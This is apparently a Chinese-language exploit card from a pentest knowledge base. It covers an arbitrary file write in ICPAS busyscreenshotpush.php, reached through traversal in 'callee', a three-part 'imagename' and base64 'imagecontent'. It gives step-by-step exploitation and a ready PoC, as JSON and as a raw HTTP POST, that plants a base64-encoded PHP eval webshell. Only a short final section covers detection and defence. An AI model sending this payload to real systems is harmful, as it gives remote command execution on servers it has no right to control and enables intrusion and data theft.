---
id: web-generic-file-upload-icpas-busyscreenshotpush-base64-file-write
title: ICPAS busyscreenshotpush.php：jsondata 的 imagecontent base64 解码后 file_put_contents，callee 控目录、imagename 需 a_b_c.php
type: scenario
domain: web
path: web/generic/file-upload
technique: icpas-busyscreenshotpush-base64-file-write
aliases:
- ICPAS busyscreenshotpush 任意写
- imagecontent base64 写文件
- imagename 三段式绕过
- 截图接口写 webshell
tags:
- php
- file-upload
- arbitrary-file-write
- base64
- webshell
- icpas
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:22:53+08:00'
  notes: 已对照原文图14-18核对；caller/callee/imagename/imagecontent、callee 控目录、imagename 恰好三段、imagecontent base64_decode 后 file_put_contents 均一致；已修正目录前缀为原文代码的 ../../../Uploadtmp/busyscreenshot/（原卡写 ../../）；PoC 为构造性，原文未实际写入验证
---

## 一句话结论

ICPAS 的 `php/busyscreenshotpush.php` 从 `$_POST['jsondata']` 读取 `caller`/`callee`/`imagename`/`imagecontent`：目录是 `../../../Uploadtmp/busyscreenshot/` 拼 `callee`，文件名是 `imagename`，内容经 `trim` 后若匹配 `data:image/...;base64,` 前缀就剥掉前缀再 `base64_decode`（否则直接 `base64_decode`），最后 `file_put_contents($imagefile, $content)`；唯一约束是 `imagename` 按 `_` 分割必须恰好 3 段（如 `1_2_3.php`）。攻击者用 `callee` 做目录穿越、`imagename=a_b_c.php`、`imagecontent` 填 PHP 代码的 base64，即可写 WebShell。

## 原理

- **JSON 参数**：`$postData = $_POST['jsondata']`，只有 caller、callee、imagename、imagecontent 均非空才进入处理。
- **目录**：`$uploaddir = "../../../Uploadtmp/busyscreenshot/" . $callee`；若不存在则 `mkdir($uploaddir, 0777, true)`。`callee` 未过滤，可含 `../` 跳到 Web 根。
- **文件名约束**：`$imagenamevalues = explode('_', $imagename); if (count($imagenamevalues) == 3)`。因此文件名必须恰好由两个下划线分成三段；`1_2_3.php` 合法，`shell.php` 不合法。该检查只数段数，不校验扩展名或内容。
- **内容**：`$content = trim($imagecontent)`；若 `preg_match('/^(data:\s*image\/(\w+);base64,)/', $content, $result)` 成功，则去掉匹配前缀后 `base64_decode`；否则走 else 分支 `file_put_contents($imagefile, base64_decode($content))`。两条分支都把 base64 解码后的任意字节写入磁盘，没有图片内容校验。
- **为什么能 RCE**：`file_put_contents` 会创建/覆盖目标文件；`callee` 控制目录、`imagename` 控制文件名（满足三段式），扩展名 `.php` 未受限。写入 PHP 代码后访问对应 URL 即可执行。
- 与同系统 `uploadjson.php` 的区别：后者用 `filename` + 原文 `data` 经 `fopen/fwrite`；本接口用图片协议字段 + base64 解码，且文件名有三段式约束，属于不同入口与不同编码路径。

## 触发条件

- 目标为 ICPAS，`php/busyscreenshotpush.php` 可访问（认证要求取决于部署，原文未展开）。
- PHP 进程对 `Uploadtmp/busyscreenshot/` 及其穿越目标有写权限。
- 能发送 `jsondata` POST 参数并控制 `callee`/`imagename`/`imagecontent`。

## 利用步骤

1. 构造 `jsondata`：`caller`、`callee`、`imagename`、`imagecontent` 均非空。
2. `callee` 设为 `../../..` 或指向 Web 根的子目录，使 `$uploaddir` 穿越到可访问目录。
3. `imagename` 用三段式，如 `1_2_3.php`；确保 `explode('_')` 结果为 3 段。
4. `imagecontent` 填 `<?php @eval($_POST['cmd']); ?>` 的 base64（可带或不带 `data:image/png;base64,` 前缀）。
5. POST `jsondata=...`，访问写入的文件验证命令执行。

## PoC

```json
{
  "caller": "1",
  "callee": "../../../www",
  "imagename": "1_2_3.php",
  "imagecontent": "PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+"
}
```

```http
POST /php/busyscreenshotpush.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

jsondata={"caller":"1","callee":"../../../www","imagename":"1_2_3.php","imagecontent":"PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+"}
```

## 变体与关联

- 变体：`imagecontent` 带 `data:image/png;base64,` 前缀走正则分支；不带前缀走 else 分支，效果相同。
- 变体：同系统 `uploadjson.php` 用 `filename` 路径穿越 + 原文 `data` 写文件（见关联卡）。
- 关联：[[web-generic-file-upload-icpas-uploadjson-path-traversal-arbitrary-write]]
- 关联：[[web-generic-file-upload-icpas-addmediadata-fullpath-upload-arbitrary-write]]
- 关联：[[web-generic-file-upload-icpas-addscenedata-php-webshell]]

## 检测与防御

- 检测：`busyscreenshotpush.php` 请求的 `imagename` 含 `.php` 等可执行扩展名、`callee` 含 `..` 或绝对路径；`imagecontent` 解码后以 `<?php`、`<?=` 开头。
- 检测：`Uploadtmp/busyscreenshot/` 或 Web 根出现异常 PHP 文件；`file_put_contents` 高熵/脚本内容写入。
- 防御：`callee`/`imagename` 严格白名单（数字/固定格式），落点固定目录并用 `basename()`/`realpath()` 校验；`imagecontent` 校验真实图片魔数并重编码；上传目录禁止脚本执行；升级修复版本。
